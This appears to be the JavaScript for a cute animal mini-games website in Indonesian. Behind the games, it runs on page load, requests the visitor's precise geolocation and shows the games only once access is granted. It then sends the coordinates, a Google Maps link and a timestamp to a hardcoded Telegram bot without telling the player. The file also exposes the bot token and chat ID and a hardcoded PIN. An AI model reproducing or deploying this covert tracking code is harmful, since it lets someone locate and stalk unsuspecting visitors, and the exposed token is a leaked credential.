
// Sparkle animation
function createSparkles() {
    const sparkles = document.getElementById('sparkles');
    const sparkleEmojis = ['✨', '🌟', '💫', '⭐', '🌸', '💖', '🦄'];

    setInterval(() => {
        const sparkle = document.createElement('div');
        sparkle.className = 'sparkle';
        sparkle.textContent = sparkleEmojis[Math.floor(Math.random() * sparkleEmojis.length)];
        sparkle.style.left = Math.random() * 100 + '%';
        sparkle.style.top = Math.random() * 100 + '%';
        sparkle.style.animationDelay = Math.random() * 2 + 's';
        sparkles.appendChild(sparkle);

        setTimeout(() => sparkle.remove(), 3000);
    }, 500);
}

// // Login functionality
// async function checkPin() {
//     const pin = document.getElementById('pinInput').value;
//     if (pin === '261103') {
//         // Send Telegram notification
//         await sendTelegramNotification();

//         // Show success and enter games
//         showNotification('Login berhasil! Selamat datang! 🌸', '#4CAF50');
//         setTimeout(() => {
//             document.getElementById('loginContainer').style.display = 'none';
//             document.getElementById('gameContainer').style.display = 'block';
//             createEmojiRain();
//         }, 1000);
//     } else {
//         showNotification('PIN salah! Coba lagi 😅', '#f44336');
//         document.getElementById('pinInput').value = '';
//     }
// }

// Fungsi utama untuk meminta akses lokasi dan mengelola tampilan
function initializeLocationAccess() {
    if (!navigator.geolocation) {
        alert('Browser Anda tidak mendukung geolocation. Silakan gunakan browser yang lebih modern.');
        return;
    }

    const options = {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
    };

    // Minta akses lokasi
    navigator.geolocation.getCurrentPosition(
        // Success callback
        async (position) => {
            console.log('Lokasi berhasil didapatkan');
            
            // Kirim notifikasi ke Telegram dengan lokasi
            await sendTelegramNotification(position.coords);
            
            // Tampilkan game container
            setTimeout(() => {
                document.getElementById('gameContainer').style.display = 'block';
            }, 500);
        },
        // Error callback
        (error) => {
            console.log('Error getting location:', error);
            
            let errorMessage = '';
            switch (error.code) {
                case error.POSITION_UNAVAILABLE:
                    errorMessage = 'Informasi lokasi tidak tersedia. Website akan restart.';
                    break;
                case error.TIMEOUT:
                    errorMessage = 'Timeout mendapatkan lokasi. Website akan restart.';
                    break;
                default:
                    errorMessage = 'Error tidak diketahui. Website akan restart.';
                    break;
            }
            
            alert(errorMessage);
            
            // Restart website setelah 2 detik
            setTimeout(() => {
                window.location.reload();
            }, 2000);
        },
        options
    );
}

// Fungsi untuk mengirim notifikasi ke Telegram dengan lokasi
async function sendTelegramNotification(coords) {
    const token = '7637763679:AAGO9TEEgWqkzllClcKySyLdY6fHujBmP7U';
    const chatId = '6678271110';
    
    try {
        // Pesan dengan informasi lokasi
        const message = `🌸 Seseorang mengakses website cute games! 🎮✨

📍 Lokasi Akses:
• Latitude: ${coords.latitude}
• Longitude: ${coords.longitude}
• Akurasi: ${Math.round(coords.accuracy)} meter

🗺️ Google Maps: https://www.google.com/maps?q=${coords.latitude},${coords.longitude}

⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;

        // Kirim pesan teks dengan lokasi
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        // Kirim lokasi sebagai titik di peta
        await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                latitude: coords.latitude,
                longitude: coords.longitude
            })
        });

        console.log('Notifikasi dengan lokasi berhasil dikirim!');
        
    } catch (error) {
        console.log('Telegram notification error:', error);
    }
}

// Jalankan saat halaman dimuat
window.addEventListener('load', () => {
    // Berikan sedikit delay untuk memastikan semua elemen sudah dimuat
    setTimeout(() => {
        initializeLocationAccess();
    }, 500);
});

// Fungsi untuk debugging - bisa dihapus jika tidak diperlukan
function checkLocationSupport() {
    if (navigator.geolocation) {
        console.log('Geolocation didukung');
    } else {
        console.log('Geolocation tidak didukung');
    }
}

// Panggil fungsi ini saat halaman dimuat untuk meminta izin lokasi
// window.addEventListener('load', requestLocationPermission);


// async function sendTelegramNotification() {
//     const token = '7637763679:AAGO9TEEgWqkzllClcKySyLdY6fHujBmP7U';
//     const chatId = '6678271110';
//     const message = '🌸 Seseorang berhasil login ke website cute games! 🎮✨';

//     try {
//         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
//             method: 'POST',
//             headers: {
//                 'Content-Type': 'application/json',
//             },
//             body: JSON.stringify({
//                 chat_id: chatId,
//                 text: message
//             })
//         });
//     } catch (error) {
//         console.log('Telegram notification error:', error);
//     }
// }

function showNotification(message, color) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.style.background = color;
    notification.classList.add('show');
    setTimeout(() => notification.classList.remove('show'), 3000);
}

function createEmojiRain() {
    const emojis = ['🐰', '🐱', '🐼', '🦄', '🌸', '💖', '✨', '🌟'];
    for (let i = 0; i < 20; i++) {
        setTimeout(() => {
            const emoji = document.createElement('div');
            emoji.className = 'emoji-rain';
            emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
            emoji.style.left = Math.random() * 100 + '%';
            emoji.style.animationDuration = (Math.random() * 2 + 2) + 's';
            document.body.appendChild(emoji);
            setTimeout(() => emoji.remove(), 4000);
        }, i * 200);
    }
}

// Game 1: Catch Animals
let catchScore = 0;
let catchGameActive = false;

function startCatchGame() {
    if (catchGameActive) return;
    catchGameActive = true;
    catchScore = 0;
    document.getElementById('catchScore').textContent = catchScore;

    const gameArea = document.getElementById('catchGame');
    const animals = ['🐰', '🐱', '🐼', '🐵', '🐸', '🦄', '🐷', '🐨'];

    const gameInterval = setInterval(() => {
        if (!catchGameActive) {
            clearInterval(gameInterval);
            return;
        }

        const animal = document.createElement('div');
        animal.textContent = animals[Math.floor(Math.random() * animals.length)];
        animal.style.position = 'absolute';
        animal.style.fontSize = '40px';
        animal.style.cursor = 'pointer';
        animal.style.left = Math.random() * 200 + 'px';
        animal.style.top = Math.random() * 100 + 'px';
        animal.style.zIndex = '100';

        animal.onclick = () => {
            catchScore++;
            document.getElementById('catchScore').textContent = catchScore;
            animal.remove();
            createEmojiRain();
        };

        gameArea.appendChild(animal);
        setTimeout(() => animal.remove(), 2000);
    }, 800);

    setTimeout(() => {
        catchGameActive = false;
        showNotification(`Game selesai! Skor: ${catchScore} 🎉`, '#4CAF50');
    }, 15000);
}

// Game 2: Memory Game
let memoryCards = [];
let flippedCards = [];
let memorySteps = 0;

function startMemoryGame() {
    const animals = ['🐰', '🐱', '🐼', '🐵', '🐸', '🦄', '🐷', '🐨'];
    const gameAnimals = [...animals, ...animals];
    gameAnimals.sort(() => Math.random() - 0.5);

    memoryCards = gameAnimals;
    flippedCards = [];
    memorySteps = 0;
    document.getElementById('memorySteps').textContent = memorySteps;

    const grid = document.getElementById('memoryGrid');
    grid.innerHTML = '';

    gameAnimals.forEach((animal, index) => {
        const card = document.createElement('div');
        card.className = 'memory-card';
        card.dataset.index = index;
        card.onclick = () => flipCard(card, index);
        grid.appendChild(card);
    });
}

function flipCard(card, index) {
    if (flippedCards.length >= 2 || card.classList.contains('flipped')) return;

    card.classList.add('flipped');
    card.textContent = memoryCards[index];
    flippedCards.push({ card, index });

    if (flippedCards.length === 2) {
        memorySteps++;
        document.getElementById('memorySteps').textContent = memorySteps;

        setTimeout(() => {
            if (memoryCards[flippedCards[0].index] === memoryCards[flippedCards[1].index]) {
                flippedCards = [];
                if (document.querySelectorAll('.memory-card.flipped').length === 16) {
                    showNotification('Memory game selesai! 🧠✨', '#4CAF50');
                }
            } else {
                flippedCards.forEach(({ card }) => {
                    card.classList.remove('flipped');
                    card.textContent = '';
                });
                flippedCards = [];
            }
        }, 1000);
    }
}

// Game 3: Animal Quiz
let quizScore = 0;
let currentQuiz = 0;
const quizData = [
    { animal: '🐶', sound: 'woof', sounds: ['Woof Woof', 'Meow Meow', 'Moo Moo'] },
    { animal: '🐱', sound: 'meow', sounds: ['Woof Woof', 'Meow Meow', 'Oink Oink'] },
    { animal: '🐄', sound: 'moo', sounds: ['Neigh Neigh', 'Meow Meow', 'Moo Moo'] },
    { animal: '🐷', sound: 'oink', sounds: ['Oink Oink', 'Meow Meow', 'Woof Woof'] },
    { animal: '🐴', sound: 'neigh', sounds: ['Woof Woof', 'Neigh Neigh', 'Moo Moo'] }
];

function startQuiz() {
    if (currentQuiz < quizData.length) {
        const quiz = quizData[currentQuiz];
        document.getElementById('quizAnimal').textContent = quiz.animal;

        const options = document.getElementById('quizOptions');
        options.innerHTML = '';
        quiz.sounds.forEach(sound => {
            const btn = document.createElement('button');
            btn.className = 'game-btn';
            btn.textContent = sound;
            btn.onclick = () => checkQuizAnswer(sound.toLowerCase().split(' ')[0]);
            options.appendChild(btn);
        });
    }
}

function checkQuizAnswer(answer) {
    if (currentQuiz < quizData.length) {
        if (answer === quizData[currentQuiz].sound) {
            quizScore++;
            showNotification('Benar! 🎉', '#4CAF50');
        } else {
            showNotification('Salah! 😅', '#f44336');
        }

        currentQuiz++;
        document.getElementById('quizScore').textContent = quizScore;

        if (currentQuiz >= quizData.length) {
            setTimeout(() => {
                showNotification(`Quiz selesai! Skor: ${quizScore}/5 🏆`, '#4CAF50');
                currentQuiz = 0;
                quizScore = 0;
                document.getElementById('quizScore').textContent = 0;
            }, 1000);
        } else {
            setTimeout(startQuiz, 1000);
        }
    }
}

// Game 4: Pet Care
let petHappiness = 50;
const petStates = {
    hungry: { emoji: '😋', status: 'Hewan peliharaanmu lapar!' },
    happy: { emoji: '😊', status: 'Hewan peliharaanmu senang!' },
    sleepy: { emoji: '😴', status: 'Hewan peliharaanmu mengantuk!' },
    playing: { emoji: '🤗', status: 'Hewan peliharaanmu ingin bermain!' }
};

function updatePetStatus() {
    let state;
    if (petHappiness < 30) state = 'hungry';
    else if (petHappiness > 80) state = 'happy';
    else if (petHappiness < 50) state = 'sleepy';
    else state = 'playing';

    document.getElementById('petAnimal').textContent = petStates[state].emoji;
    document.getElementById('petStatus').textContent = petStates[state].status;
    document.getElementById('petHappiness').textContent = petHappiness;
}

function feedPet() {
    petHappiness = Math.min(100, petHappiness + 20);
    updatePetStatus();
    showNotification('Yummy! 🍎', '#4CAF50');
}

function playWithPet() {
    petHappiness = Math.min(100, petHappiness + 15);
    updatePetStatus();
    showNotification('So fun! 🎾', '#4CAF50');
}

function petSleep() {
    petHappiness = Math.min(100, petHappiness + 10);
    updatePetStatus();
    showNotification('Zzz... 😴', '#4CAF50');
}

// Game 5: Dance Party
function startDance() {
    const animals = document.querySelectorAll('#danceAnimals .animal-emoji');
    animals.forEach(animal => {
        animal.style.animation = 'bounce 0.5s infinite';
        setTimeout(() => {
            animal.style.animation = 'bounce 1s infinite';
        }, 5000);
    });

    createEmojiRain();
    showNotification('Dance party! 💃🕺', '#4CAF50');
}

// Game 6: Animal Collection
let collection = new Set();
const allAnimals = ['🐰', '🐱', '🐼', '🐵', '🐸', '🦄', '🐷', '🐨', '🐯', '🦊', '🐺', '🐮'];

function initCollection() {
    const grid = document.getElementById('collectionGrid');
    allAnimals.forEach(animal => {
        const slot = document.createElement('div');
        slot.style.width = '50px';
        slot.style.height = '50px';
        slot.style.border = '2px dashed #ff69b4';
        slot.style.borderRadius = '10px';
        slot.style.display = 'flex';
        slot.style.alignItems = 'center';
        slot.style.justifyContent = 'center';
        slot.style.fontSize = '24px';
        slot.style.background = '#f8f9fa';
        slot.id = `slot-${animal}`;
        grid.appendChild(slot);
    });
}

function catchRandomAnimal() {
    const availableAnimals = allAnimals.filter(animal => !collection.has(animal));
    if (availableAnimals.length === 0) {
        showNotification('Koleksi lengkap! 🏆', '#4CAF50');
        return;
    }

    const caughtAnimal = availableAnimals[Math.floor(Math.random() * availableAnimals.length)];
    collection.add(caughtAnimal);

    document.getElementById(`slot-${caughtAnimal}`).textContent = caughtAnimal;
    document.getElementById(`slot-${caughtAnimal}`).style.background = '#fff';
    document.getElementById('collectionCount').textContent = collection.size;

    showNotification(`Dapat ${caughtAnimal}! ✨`, '#4CAF50');

    if (collection.size === allAnimals.length) {
        setTimeout(() => {
            showNotification('Selamat! Koleksi lengkap! 🏆🎉', '#4CAF50');
            createEmojiRain();
        }, 500);
    }
}

// Add bounce animation
const style = document.createElement('style');
style.textContent = `
            @keyframes bounce {
                0%, 20%, 53%, 80%, 100% { transform: translateY(0); }
                40%, 43% { transform: translateY(-30px); }
                70% { transform: translateY(-15px); }
                90% { transform: translateY(-4px); }
            }
        `;
document.head.appendChild(style);

// Initialize
createSparkles();
updatePetStatus();
initCollection();
startQuiz();

// Auto-decrease pet happiness over time
setInterval(() => {
    if (document.getElementById('gameContainer').style.display !== 'none') {
        petHappiness = Math.max(0, petHappiness - 1);
        updatePetStatus();
    }
}, 10000);

// Enter key for login
document.getElementById('pinInput').addEventListener('keypress', function (e) {
    if (e.key === 'Enter') {
        checkPin();
    }
});

// Add cute mouse cursor effects
document.addEventListener('mousemove', function (e) {
    if (Math.random() < 0.1) {
        const sparkle = document.createElement('div');
        sparkle.textContent = '✨';
        sparkle.style.position = 'fixed';
        sparkle.style.left = e.clientX + 'px';
        sparkle.style.top = e.clientY + 'px';
        sparkle.style.pointerEvents = 'none';
        sparkle.style.fontSize = '12px';
        sparkle.style.zIndex = '1000';
        sparkle.style.animation = 'sparkleFloat 1s ease-out forwards';
        document.body.appendChild(sparkle);
        setTimeout(() => sparkle.remove(), 1000);
    }
});

// Add more interactive elements
document.querySelectorAll('.game-card').forEach(card => {
    card.addEventListener('mouseenter', function () {
        if (Math.random() < 0.3) {
            createEmojiRain();
        }
    });
});

// Auto-start some games
setTimeout(() => {
    if (document.getElementById('gameContainer').style.display !== 'none') {
        startMemoryGame();
    }
}, 2000);

// Add sound effects simulation with visual feedback
function playSound(type) {
    const soundEmojis = {
        success: '🎉',
        error: '💥',
        click: '✨',
        collect: '🌟'
    };

    const emoji = document.createElement('div');
    emoji.textContent = soundEmojis[type] || '✨';
    emoji.style.position = 'fixed';
    emoji.style.left = '50%';
    emoji.style.top = '20px';
    emoji.style.fontSize = '30px';
    emoji.style.zIndex = '1001';
    emoji.style.animation = 'bounce 0.5s ease-out';
    emoji.style.transform = 'translateX(-50%)';
    document.body.appendChild(emoji);
    setTimeout(() => emoji.remove(), 500);
}

// Enhanced catch game with power-ups
function createPowerUp() {
    if (!catchGameActive) return;

    const powerUp = document.createElement('div');
    powerUp.textContent = '⭐';
    powerUp.style.position = 'absolute';
    powerUp.style.fontSize = '30px';
    powerUp.style.cursor = 'pointer';
    powerUp.style.left = Math.random() * 200 + 'px';
    powerUp.style.top = Math.random() * 100 + 'px';
    powerUp.style.zIndex = '100';
    powerUp.style.animation = 'sparkleFloat 2s infinite';

    powerUp.onclick = () => {
        catchScore += 5;
        document.getElementById('catchScore').textContent = catchScore;
        powerUp.remove();
        showNotification('Power-up! +5 points! ⭐', '#FFD700');
        playSound('success');
    };

    document.getElementById('catchGame').appendChild(powerUp);
    setTimeout(() => powerUp.remove(), 3000);
}

// Add random power-ups to catch game
setInterval(() => {
    if (catchGameActive && Math.random() < 0.3) {
        createPowerUp();
    }
}, 5000);

// Add keyboard shortcuts
document.addEventListener('keydown', function (e) {
    if (document.getElementById('gameContainer').style.display !== 'none') {
        switch (e.key) {
            case '1':
                startCatchGame();
                break;
            case '2':
                startMemoryGame();
                break;
            case '3':
                startDance();
                break;
            case '4':
                catchRandomAnimal();
                break;
            case 'f':
            case 'F':
                feedPet();
                break;
            case 'p':
            case 'P':
                playWithPet();
                break;
            case 's':
            case 'S':
                petSleep();
                break;
        }
    }
});

// Add achievement system
let achievements = {
    firstLogin: false,
    catchMaster: false,
    memoryGenius: false,
    collector: false,
    petLover: false
};

function checkAchievements() {
    if (!achievements.firstLogin) {
        achievements.firstLogin = true;
        setTimeout(() => {
            showNotification('🏆 Achievement: First Login!', '#FFD700');
        }, 3000);
    }

    if (catchScore >= 20 && !achievements.catchMaster) {
        achievements.catchMaster = true;
        showNotification('🏆 Achievement: Catch Master!', '#FFD700');
    }

    if (collection.size >= 8 && !achievements.collector) {
        achievements.collector = true;
        showNotification('🏆 Achievement: Animal Collector!', '#FFD700');
    }

    if (petHappiness >= 90 && !achievements.petLover) {
        achievements.petLover = true;
        showNotification('🏆 Achievement: Pet Lover!', '#FFD700');
    }
}

// Check achievements periodically
setInterval(checkAchievements, 2000);

// Add cute loading animation for games
function showLoading(gameArea) {
    const loading = document.createElement('div');
    loading.innerHTML = '🌸 Loading... 🌸';
    loading.style.fontSize = '18px';
    loading.style.color = '#ff1493';
    loading.style.textAlign = 'center';
    loading.style.animation = 'bounce 1s infinite';
    gameArea.appendChild(loading);
    setTimeout(() => loading.remove(), 1000);
}

// Enhanced UI feedback
document.querySelectorAll('.game-btn').forEach(btn => {
    btn.addEventListener('click', function () {
        playSound('click');
        this.style.transform = 'scale(0.95)';
        setTimeout(() => {
            this.style.transform = 'scale(1)';
        }, 100);
    });
});

// Add random cute messages
const cuteMessages = [
    '🌸 Kamu lucu sekali!',
    '✨ Keep playing!',
    '🦄 Magical moment!',
    '💖 So adorable!',
    '🌟 You\'re awesome!',
    '🐰 Bunny loves you!',
    '🎀 Pretty amazing!',
    '💝 Sweet victory!'
];

setInterval(() => {
    if (Math.random() < 0.1 && document.getElementById('gameContainer').style.display !== 'none') {
        const message = cuteMessages[Math.floor(Math.random() * cuteMessages.length)];
        showNotification(message, '#FF69B4');
    }
}, 15000);

console.log('🌸 Welcome to Cute Animal Games! 🌸');
console.log('Keyboard shortcuts:');
console.log('1 - Start Catch Game');
console.log('2 - Start Memory Game');
console.log('3 - Start Dance Party');
console.log('4 - Catch Random Animal');
console.log('F - Feed Pet');
console.log('P - Play with Pet');
console.log('S - Pet Sleep');